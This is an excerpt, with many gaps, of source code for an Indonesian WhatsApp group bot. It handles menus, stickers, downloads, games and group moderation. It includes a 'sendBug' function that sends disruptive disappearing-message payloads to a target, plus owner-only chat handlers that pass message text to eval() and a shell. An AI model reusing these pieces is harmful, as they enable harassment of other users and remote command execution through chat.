...
try {
        if (!imp.hasNewMessage) return
        mek = imp.messages.all()[0]
	    if (!imp.message) return
	    if (imp.key && !imp.key.remoteJid == 'status@broadcast') return
	    if ((Object.keys(imp.message)[0] === 'ephemeralMessage' && JSON.stringify(imp.message).includes('EPHEMERAL_SETTING')) && imp.message.ephemeralMessage.message.protocolMessage.type === 3 && bugc && !imp.key.fromMe) {
		nums = imp.participant
        longkapnye = "\n".repeat(420)
        tekuss = `\`\`\`TANDAI TELAH DIBACA !!!\`\`\`${longkapnye}\`\`\`@⁨${nums.split('@')[0]} Terdeteksi Telah Mengirim Bug, @⁨${nums.split('@')[0]} Akan Dikick!\`\`\`\n`
        impo.groupRemove(imp.key.remoteJid, [nums]).catch((e) => { reply(`*ERR:* ${e}`) })
        impo.sendMessage(imp.key.remoteJid, tekuss, MessageType.text, {contextInfo:{mentionedJid:[nums + "@s.whatsapp.net"]}})
        }
        imp.message = (Object.keys(imp.message)[0] === 'ephemeralMessage') ? imp.message.ephemeralMessage.message : imp.message
		const typei = Object.keys(imp.message)[0]
		global.prefix
		me = impo.user
		m = simple.smsg(denz, mek)
		const antibot = m.isBaileys
		const content = JSON.stringify(imp.message)
		const from = imp.key.remoteJid
		const type = Object.keys(imp.message)[0]
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio } = MessageType
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		const timeWib = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		const timeWita = moment().tz('Asia/Makassar').format('DD/MM HH:mm:ss')
        const timeWit = moment().tz('Asia/Jayapura').format('DD/MM HH:mm:ss')
		const cmd = (type === 'conversation' && imp.message.conversation) ? imp.message.conversation : (type == 'imageMessage') && imp.message.imageMessage.caption ? imp.message.imageMessage.caption : (type == 'videoMessage') && imp.message.videoMessage.caption ? imp.message.videoMessage.caption : (type == 'extendedTextMessage') && imp.message.extendedTextMessage.text ? imp.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(imp.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(imp.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(imp.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
		impo.on("CB:action,,battery", json => {
        ...
        isStc = Object.keys(imp.message)[0] == "stickerMessage" ? imp.message.stickerMessage.fileSha256.toString('hex') : ""
	    isStc = `${isStc}`
        const isStcQ = isStc !== "" && content.includes("extendedTextMessage") ||
        isStc !== "" && content.includes("conversation")
        const body = (type === 'listResponseMessage' && imp.message.listResponseMessage.title) ? imp.message.listResponseMessage.title : (type === 'buttonsResponseMessage' && imp.message.buttonsResponseMessage.selectedButtonId) ? imp.message.buttonsResponseMessage.selectedButtonId : (type === 'conversation' && imp.message.conversation.startsWith(prefix)) ? imp.message.conversation : (type == 'imageMessage') && imp.message.imageMessage.caption.startsWith(prefix) ? imp.message.imageMessage.caption : (type == 'videoMessage') && imp.message.videoMessage.caption.startsWith(prefix) ? imp.message.videoMessage.caption : (type == 'extendedTextMessage') && imp.message.extendedTextMessage.text.startsWith(prefix) ? imp.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(imp.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(imp.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(imp.message.stickerMessage.fileSha256.toString('base64')) : ""
		const budo = (typei === 'conversation') ? imp.message.conversation : (typei === 'extendedTextMessage') ? imp.message.extendedTextMessage.text : ''
		const budy = (type === 'conversation') ? imp.message.conversation : (type === 'extendedTextMessage') ? imp.message.extendedTextMessage.text : ''
		const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const arg = budy.slice(command.length + 2, budy.length)
		const c = args.join(' ')
		var pes = (type === 'conversation' && imp.message.conversation) ? imp.message.conversation : (type == 'imageMessage') && imp.message.imageMessage.caption ? imp.message.imageMessage.caption : (type == 'videoMessage') && imp.message.videoMessage.caption ? imp.message.videoMessage.caption : (type == 'extendedTextMessage') && imp.message.extendedTextMessage.text ? imp.message.extendedTextMessage.text : ''
		const messagesD = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
		const dfrply = fs.readFileSync('./imp.jpg')
		cmhit.push(command)
        mess = {
			wait: 'Wait a minute',
			success: 'Success',
		...
		const botNumber = impo.user.jid
		const isGroup = from.endsWith('@g.us')
		const sender = imp.key.fromMe ? impo.user.jid : isGroup ? imp.participant : imp.key.remoteJid
		const senderNumber = sender.split("@")[0] 
		const conts = imp.key.fromMe ? impo.user.jid : impo.contacts[imp.sender]
        const pushname = imp.key.fromMe ? impo.user.name : !conts ? '-' : conts.notify || conts.vname || conts.name || '-'   
		const totalchat = await impo.chats.all()
		const groupMetadata = isGroup ? await impo.groupMetadata(from) : ''
		...
		const isButton = (type == 'buttonsResponseMessage') ? imp.message.buttonsResponseMessage.selectedButtonId : ''
		const isUrl = (url) => {
		return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
		}
		if (antibot === true) return
		const katalog = (teks) => {
             res = impo.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 321, "message": teks, "footerText": "*_© ιмpoѕιввle ⻠_*", "thumbnail": ofrply, "surface": 'CATALOG' }}, {quoted:ftrol})
             impo.relayWAMessage(res)
        }
        const grupinv = (teks) => {
        	grup = impo.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '6288213840883-1616169743@g.us', "inviteCode": 'https://chat.whatsapp.com/jfkfkdkdkdkdodkdk', "groupName": `${NamaBot}`, "footerText": "*_© ιмpoѕιввle ⻠_*", "jpegThumbnail": ofrply, "caption": teks}}, {quoted:finv})
            impo.relayWAMessage(grup)
        }
		idttt = []
	    players1 = []
	    players2 = []
		...
		try {
		pporang = await impo.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
		      } catch {
		pporang = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
		      }
		const ofrply = await getBuffer(pporang)
		const pporigi = fs.readFileSync('./imp.jpg')
...
const sendBug = async (target) => {
      await impo.relayWAMessage(
        impo.prepareMessageFromContent(
          target,
          impo.prepareDisappearingMessageSettingContent(0),
          {}
        ),{ waitForAck: true }) 
    }
    //But verify
...
impo.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
}
///Button Image
const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await impo.prepareMessage(from, kma, image)
...
impo.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Video
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await impo.prepareMessage(from, kma, video)
const buttonMessages = {
...
kma = gam1
mhan = await impo.prepareMessage(from, kma, location)
const buttonMessages = {
...
if (!imp.key.remoteJid.endsWith('@g.us') && offline){
			if (!imp.key.fromMe){
            if (isAfk(imp.key.remoteJid)) return
            addafk(imp.key.remoteJid)
			heheh = ms(Date.now() - waktuafk)
		  sendButMessage(from, `Hai ${pushname}, Maaf sepertinya saat ini ${NamaOwner} sedang Offline\n\n*Alasan :* ${alasanafk}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik\n\nSilahkan hubungi lagi setelah Online`, "*_© ιмpoѕιввle ⻠_*", [{buttonId: 'simi', buttonText: {displayText: 'Oke'}, type: 1}], {quoted:ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
			}
		}
		if (imp.key.remoteJid.endsWith('@g.us') && offline) {
			if (!imp.key.fromMe){
				if (imp.message.extendedTextMessage != undefined){
					if (imp.message.extendedTextMessage.contextInfo != undefined){
						if (imp.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
				for (let ment of imp.message.extendedTextMessage.contextInfo.mentionedJid) {
					if (ment === impo.user.jid){
                        if (isAfk(imp.key.remoteJid)) return
                        addafk(imp.key.remoteJid)
						heheh = ms(Date.now() - waktuafk)
			       sendButMessage(from, `Hai ${pushname}, Maaf sepertinya saat ini ${NamaOwner} sedang Offline\n\n*Alasan :* ${alasanafk}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik\n\nSilahkan hubungi lagi setelah Online`, "*_© ιмpoѕιввle ⻠_*", [{buttonId: 'simi', buttonText: {displayText: 'Oke'}, type: 1}], {quoted:ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
		...
		const sendStickerUrl = async(to, url) => {
			console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker'))
				...
				download(url, namea, async function () {
					...
					impo.sendMessage(to, media, sticker, {quoted: mek})
        ...
        const sendWebp = async(from, url) => {
                ...
                download(url, './temp' + names + '.png', async function () {
                    ...
                    exec(`ffmpeg -i ${ajg} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${palak}`, (err) => {
                        ...
                        impo.sendMessage(from, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(ajg)
                        fs.unlinkSync(palak)
                    });
                });
	        ...
	        impo.sendMessage(from, { displayname: nama, vcard: vcard}, MessageType.contact, {quoted:imp, contextInfo: { forwardingScore: 508, isForwarded: true }})
            }
            const hideTagKontak = async function(from, nomor, nama){
	        let vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:Kontak\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
	        let anu = await impo.groupMetadata(from)
	        let members = anu.participants
	        let ane = []
	        for (let i of members){
		    ane.push(i.jid)
	        }
	        impo.sendMessage(from, { displayname: nama, vcard: vcard}, MessageType.contact, {contextInfo: {"mentionedJid": ane}})
            }
		const reply = (teks) => {
			impo.sendMessage(from, teks, text, { thumbnail: dfrply, sendEphemeral: true, quoted: imp, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `${jmn} - ${week} ${weton} - ${calender}`,body:"DON'T CLICK HERE",previewType:"PHOTO",thumbnail:ofrply,sourceUrl:`https://wa.me/qr/IZYUCENCHPWSC1`}}})
		}
		const simir = (teks) => {
			impo.sendMessage(from, teks, text, { quoted:ftrol })
		}
		const math = (teks) => {
				return Math.floor(teks)
		}
		const sendMess = (hehe, teks) => {
			impo.sendMessage(hehe, teks, text, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
		}
		//>>>>>>>>STICKER<<<<<<<\\
		const sticOwner = (hehe) => {
			ano = fs.readFileSync('./sticker/anime/owner.webp')
			impo.sendMessage(hehe, ano, sticker, { quoted: mek})
		}
		...
		const mentions = (teks, memberr, id) => {
			(id == null || id == undefined || id == false) ? impo.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : impo.sendMessage(from, teks.trim(), extendedText, { quoted: imp, contextInfo: { "mentionedJid": memberr } })
		}
		const sendFileFromUrl = async(link, type, options) => {
hasil = await getBuffer(link)
impo.sendMessage(from, hasil, type, options).catch(e => {
fetch(link).then((hasil) => {
impo.sendMessage(from, hasil, type, options).catch(e => {
impo.sendMessage(from, { url : link }, type, options).catch(e => {
reply
console.log(e)
})
})
  ...
  const sendMediaURL = async(to, url, text="", mids=[]) =>{
				...
				download(url, filename, async function () {
					...
					impo.sendMessage(to, media, type, { quoted: imp, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
		   ...
		   const sendFakeThumb = async function(from, url, title, desc){
				...
				var qul = await impo.generateLinkPreview(url)
				qul.title = title
				qul.description = desc
				qul.jpegThumbnail = dfrply
				impo.sendMessage(from, qul, MessageType.extendedText, anoim)
			}
...
return reply(parse)
           ...
           if (budy.startsWith('>')){
if (!isOwner && !imp.key.fromMe) return
console.log(color('[EVAL]'), color(moment(imp.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Eval V1 brooo`))
ras = budy.slice(1)
function _(rem) {
...
if (budy.startsWith('$')){
if (!imp.key.fromMe && !isOwner) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
...
if (!imp.key.fromMe && !isOwner) return
try {
return impo.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
reply(e)
}
...
reply(String(e))
			...
			for (let anji of setik){
				if (budy === anji){
					...
					impo.sendMessage(from, result, sticker, { quoted: imp, contextInfo: { forwardingScore: 508, isForwarded: true }})
					}
			}
			for (let anju of vien){
				if (budy === anju){
					result = fs.readFileSync(`./media/vn/${anju}.mp3`)
					impo.sendMessage(from, result, audio, { mimetype: 'audio/mp4', duration: 359996400, ptt: true, quoted: imp, contextInfo: { forwardingScore: 508, isForwarded: true}})
					}
			}
			for (let anjh of imagi){
				if (budy === anjh){
					result = fs.readFileSync(`./media/image/${anjh}.jpg`)
					impo.sendMessage(from, result, image, { quoted: imp, contextInfo: { forwardingScore: 508, isForwarded: true}})
					}
			}
			...
			// MUTE
        if (isMuted){
            if (!isGroupAdmins && !isOwner && !imp.key.fromMe) return
        ...
        if (budy.includes("https://chat.whatsapp.com/")) {
        	if (!imp.key.fromMe){
				...
				impo.updatePresence(from, Presence.composing)
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply('Link terdeteksi, Auto kick!')
			    impo.groupRemove(from, [kic]).catch((e) => { sticNotAdmin(from) })
			}
			}
			if (!m.key.fromMe && bad.includes(messagesD)) {
			ano = fs.readFileSync('./sticker/anime/toxic.webp')
			impo.sendMessage(from, ano, sticker, { quoted: mek})
                      }
if (budy.startsWith('Denz')){
sendButMessage(from, `${JSON.stringify(me, null, 2)}`, "*_© ιмpoѕιввle ⻠_*", [{buttonId: 'igm', buttonText: {displayText: 'Instagram'}, type: 1},{buttonId: 'ytm', buttonText: {displayText: 'YouTube'}, type: 1}], {quoted:ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
}
if(isButton == 'igm'){
reply('https://www.instagram.com/im_pos_ible990/')
}
if(isButton == 'ytm'){
reply('https://youtube.com/channel/UCtfZkYbSn5kyTcpEhHG7yQw')
}
   ...
   const sotoy = [
	    ...
	    if (isCmd && !isGroup) {console.log(color('|CMD|', 'greenyellow'), color(moment(imp.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'blue'), color(`${command} [${args.length}]`, 'cyan'), color(`${pushname}`, 'orange'), color(`${sender}`, 'deeppink'))}
	    if (!command) {console.log(color('|MSG|', 'greenyellow'), color(moment(imp.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'blue'), color(cmd, 'cyan'), color(`${pushname}`, 'orange'), color(`${sender}`, 'deeppink'))}
		
        switch (isStc) {
     case "5b017c6ac1fb953c7bd21034d2fca5fad75ef2da4c3b2c2877ef49fa544e74bf":
        if (!isStcSticker) return reply('Reply stickernya bgsd!')
        su = imp.message.stickerMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('hex')
        reply(su)
				}
        switch (command) {
        	case 'menu':
...
mhan = await impo.prepareMessage(from, ofrply, image, {thumbnail: ofrply})
const btnmenu = {
imageMessage: mhan.message.imageMessage,
contentText: `${fill}`,
footerText: `${menu}`,
...
impo.sendMessage(from, btnmenu, MessageType.buttonsMessage, {contextInfo :{text: 'hi',
...
"mediaType": "2",
"mediaUrl": "https://youtu.be/ig4qLi-spdM",
"thumbnail": pporigi,
},mentionedJid:[stod]}, quoted : ftrol})
}
else if(menusimpel = true){
        stod = `${sender}`
       stst = await impo.getStatus(`${sender.split('@')[0]}@c.us`)
...
│
└───「 \`\`\`${NamaBot}\`\`\` 」`
sendButLocation(from, `${menu}`, "*_© ιмpoѕιввle ⻠_*", {jpegThumbnail:ofrply,name:""}, [{buttonId:`command`,buttonText:{displayText:'LIST MENU'},type:1},{buttonId:`owner`,buttonText:{displayText:'DEVELOPER'},type:1},{buttonId:`script`,buttonText:{displayText:'SOURCE CODE'},type:1}], {contextInfo: { mentionedJid: [dtod,otod,stod]}})
}
break
case 'allmenu': 
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
...
mhan = await impo.prepareMessage(from, pporigi, image, {thumbnail: pporigi})
const btnBngsat = {
imageMessage: mhan.message.imageMessage,
contentText: `${menunya}`,
footerText: `I  M  P  右`,
...
impo.sendMessage(from, btnBngsat, MessageType.buttonsMessage, { quoted: ftrol, caption: menunya, contextInfo: { mentionedJid: [dtod,otod,stod]}})
                  }
break
case 'verify':
...
impo.sendMessage(from, sendBtnVeryy, MessageType.buttonsMessage, {quoted:ftrol, contextInfo: { mentionedJid: [sender]}})
...
impo.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [stod]},quoted:ftrol})
break
case 'ownermenu':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
menu = `❏ 「 \`\`\`MENU OWNER\`\`\` 」
...
impo.sendMessage(from, anu, image, { quoted: imp, thumbnail: fs.readFileSync('./imp.jpg')})
break
case 'nuliskanan':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!c) return reply('Textnya mana gan?')
...
impo.sendMessage(from, asu, video, { quoted: mek})
break
case 'asupan2':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
  sticWait(from)
...
impo.sendMessage(from, ano, video, { quoted: mek})
break
case 'asupant3':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
  sticWait(from)
...
ano = await getBuffer(anu.result.url)
impo.sendMessage(from, ano, image, { quoted: imp, thumbnail: fs.readFileSync('./imp.jpg')})
break
case 'maker': case 'maker2': 
case 'maker3': case 'maker4':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
  sticWait(from)
if (args.length < 1) return reply(`*Example :*\n${prefix + command} ιмpoѕιввle ⻠`)
...
break
  ...
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					...
					impo.sendMessage(from, buffer1, image, {quoted: imp, thumbnail: fs.readFileSync('./imp.jpg')})
					break
		case 'maker2d3': 
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
                    if (args.length < 1) return reply(`*Example :*\n${prefix + command} ιмpoѕιввle ⻠`)
...
mhan = await impo.prepareMessage(from, buff, image, {thumbnail: buff})
...
impo.sendMessage(from, buttonMessagessss, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./imp.jpg'),
        caption: 'Tes',
            quoted: mek})
break
//🐀💰 MALING
  ...
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					...
					if ((isMedia && !imp.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					sticWait(from)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  impo.downloadAndSaveMediaMessage(ger)
					...
					impo.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
  ...
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					...
					impo.sendMessage(from, buffer, image, {quoted: mek})
                   }
              break       
		case 'gay':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
  ...
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					...
					impo.sendMessage(from, teks, text,{quoted:imp,detectLinks: false})                        
		            })              
					break
case 'igstalk':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
...
impo.sendMessage(from, nih_buff, image, { quoted: imp, caption: tt });
}
break;      
break    
                case 'bisakah':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					...
					impo.sendMessage(from, 'Pertanyaan : *'+bisakah+'*\n\nJawaban : '+ keh, text, { quoted: mek })
					break
				case 'kapankah':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					...
					impo.sendMessage(from, 'Pertanyaan : *'+kapankah+'*\n\nJawaban : '+ koh, text, { quoted: mek })
					break
         			  case 'apakah':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					apakah = body.slice(1)
					...
					impo.sendMessage(from, 'Pertanyaan : *'+apakah+'*\n\nJawaban : '+ kah, text, { quoted: mek })
					break
				case 'rate':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					rate = body.slice(1)
					...
					impo.sendMessage(from, 'Pertanyaan : *'+rate+'*\n\nJawaban : '+ te+'%', text, { quoted: mek })
					break
		    case 'tiktokaudio':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
	...
	impo.sendMessage(from,nowmm ,MessageType.audio,{mimetype:'audio/mp4',quoted: mek})
		})
		})
		break 
	case 'igstory': 
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
            ...
            for(let i of result.medias){
                if(i.url.includes('mp4')){
                    ...
                    impo.sendMessage(from,link,video,{quoted: imp,caption: `Type : ${i.type}`})
                } else {
                    let link = await getBuffer(i.url)
                    impo.sendMessage(from,link,image,{quoted: imp,caption: `Type : ${i.type}`})                  
                }
            }
            });
            break
...
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`
            ...
            impo.sendMessage(from,ram,image,{quoted:imp,caption:rem})
            break
    case 'komiku':
    if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
...
impo.sendMessage(from, khs, audio, {mimetype:'audio/mp4', filename:'audio.mp3', quoted:imp, ptt:true})
})
break
    case 'chara':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
            ...
            await impo.sendMessage(from,li,image,{quoted: mek})
            break
//Navi
					          case 'unpin':
                if (!isOwner && !imp.key.fromMe) return sticOwner(from)
                impo.modifyChat(from, ChatModification.unpin)
                reply('*succes unpin this chat*')
                console.log('unpin chat = ' + from)
                break
            case 'pin':
                if (!isOwner && !imp.key.fromMe) return sticOwner(from)
                impo.modifyChat(from, ChatModification.pin)
             ...
             case 'archive':
                ...
                await sleep(3000)
                impo.modifyChat(from, ChatModification.archive)
                break
            case 'unreadall':
                if (!isOwner && !imp.key.fromMe) return sticOwner(from)
                var chats = await impo.chats.all()
                chats.map( async ({ jid }) => {
                await impo.chatRead(jid, 'unread')
                    })
		    var teks = `\`\`\`Successfully unread ${chats.length} chats !\`\`\``
		    await impo.sendMessage(from, teks, text, {quoted: mek})
		...
		break
            case 'unarchiveall':
                ...
                anu = await impo.chats.all()
                for (let _ of anu) {
                impo.modifyChat(_.jid, ChatModification.unarchive)
                }
                break
case 'tutuptime':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
...
setTimeout( () => {
var nomor = imp.participant
impo.groupSettingChange (from, GroupSettingChange.messageSend, true);
}, timer)
break
case 'bukatime':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
...
setTimeout( () => {
var nomor = imp.participant
impo.groupSettingChange (from, GroupSettingChange.messageSend, false);
}, timer)
break
case 'leavetime':
if (!isGroup) return reply(mess.only.group)
...
await impo.sendMessage(from, skuygelud, MessageType.buttonsMessage, {quoted: ftrol})
}
break
case 'setallmenu':
if (!isOwner && !imp.key.fromMe) return sticOwner(from)
...
await impo.sendMessage(from, skuygf, MessageType.buttonsMessage, {quoted: ftrol})
}
break
//Sampai sini
case 'jadibot':
...
client.browserDescription = ['ιмpoѕιввle ⻠','Desktop','3.0']
...
let scen = await impo.sendMessage(from, fs.readFileSync(`./jadibot@${sender}.jpg`), MessageType.image, {quoted : imp,caption: 'Scan QR ini untuk jadi bot sementara!\n1. Klik titik tiga di pojok kanan atas\n2. Ketuk WhatsApp Web\n3. Scan QR ini \n\nQR Expired dalam 20 detik'})    
setTimeout(() => {
       impo.deleteMessage(from, scen.key)
  }, 30000);
})  
...
const vname = impo.contacts[i] != undefined ? impo.contacts[i].vname || impo.contacts[i].notify : undefined
ini_list.push({
"displayName": `Developer ${NamaBot}`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;ιмpoѕιввle ⻠;;;\nFN:${vname ? `${vname}` : `${impo.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
})
}
impo.sendMessage(from, {
"displayName": `Developer ${NamaBot}`,
"contacts": ini_list 
}, 'contactsArrayMessage', { quoted: imp, contextInfo: { forwardingScore: 508, isForwarded: true }})
break
case 'addcmd': 
case 'setcmd':
if (!isOwner && !imp.key.fromMe) return sticOwner(from)
...
var kodenya = imp.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
addCmd(kodenya, c)
reply("Done Bwang")
} else {
reply('tag stickenya')
...
break
		...
		case 'sourcecode':
		anu =`╭─❒ SCRIPT
│◦➛script by ιмpoѕιввle ⻠
│
└──────[ YOUTUBE ]──────❒
  │◦➛Script : https://youtube.com/channel/UCtfZkYbSn5kyTcpEhHG7yQw
  └──────────────────❒`
 buttons = [
...
await impo.sendMessage(from, btnskuy, MessageType.buttonsMessage, {quoted: ftrol})
		break
case 'donasi':
...
*│*⬡ *GOPAY    : ${gopay}*
*└───────────────────*
KONSOL GUNAIN FITUR DONASI TAPI GA DONASI`
impo.sendMessage(from, dona, image, { quoted: ftrol, thumbnail: dona, caption: doni })
break
       case 'debug':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
			 res = await impo.prepareMessageFromContent(from,{
"templateMessage": {
						"hydratedTemplate": {
    ...
    "hydratedButtons": [
      {
        "urlButton": {
          ...
          "url": "https://youtube.com/channel/UCtfZkYbSn5kyTcpEhHG7yQw"
        },
        "index": 0
      }
    ]
...
break
                    case 'tourl':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
    if ((isMedia && !imp.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
            boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            owgi = await impo.downloadMediaMessage(boij)
...
case 'baileys':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
reply(`${imp.quoted.isBaileys}`)
break
case 'getcaption':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
try {
reply(`${imp.quoted.title}`)
} catch {
reply(`${imp.quoted.caption}`)
}
break
case 'q': 
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
    if (!m.quoted) return reply('reply pesan!')
    let qse = impo.serializeM(await m.getQuotedObj())
...
case 'listgroup':
                ...
                case 'grouplist':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
  const txs = impo.chats.all().filter(v => v.jid.endsWith('g.us')).map(v =>`- ${impo.getName(v.jid)}\n${v.jid}\n[${v.read_only ? 'Left' : 'Joined'}]`).join`\n\n`
  reply(txs)
  break
  case 'caripesan':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
...
cok = await impo.searchMessages(`${ve}`, from, batas,1) 
if (cok.messages.lenght < 2) return reply('Pesan tidak ditemukan!') 
if (cok.messages.length < parseInt(batas)) reply(`Hanya ditemukan ${cok.messages.length - 1} Pesan`)
for (let i=1;i < cok.messages.length;i++) {
if (cok.messages[i].message) {
impo.sendMessage(from, `Nih pesannya!`, text, {quoted: cok.messages[i]}) 
}
}
} catch(e) {
console.log(e)
...
await impo.sendMessage(from, btnharam, MessageType.buttonsMessage, {quoted: ftrol})
                }
                break
                case 'antidelete':
      if (!isOwner && !imp.key.fromMe) return sticOwner(from)
...
await impo.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {quoted: ftrol})
                }
                break
                case 'setprefix':
      if (!isOwner && !imp.key.fromMe) return sticOwner(from)
...
if (imp.message.extendedTextMessage === undefined || imp.message.extendedTextMessage === null) return reply('Tag target Lawan!')
ment = imp.message.extendedTextMessage.contextInfo.mentionedJid
player1 = sender
player2 = ment[0]
...
impo.sendMessage(from, `*🎳 Memulai Game Tictactoe 🎲*
...
break
		...
		try {
					ppimg = await impo.getProfilePicture(anu)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				ano = await impo.getProfilePicture(anu)
...
await impo.sendMessage(from, buMess, MessageType.buttonsMessage, {quoted: ftrol})
break
				case 'public':
				if (!isOwner && !imp.key.fromMe) return sticOwner(from)
			publik = true
...
sendFileFromUrl(random, image, {quoted: imp, caption: `*Hasil Pencarian Dari :* ${teks}`})
}
}
break
				case 'herolist':
...
*Wiki :* ${res[0].wiki}`
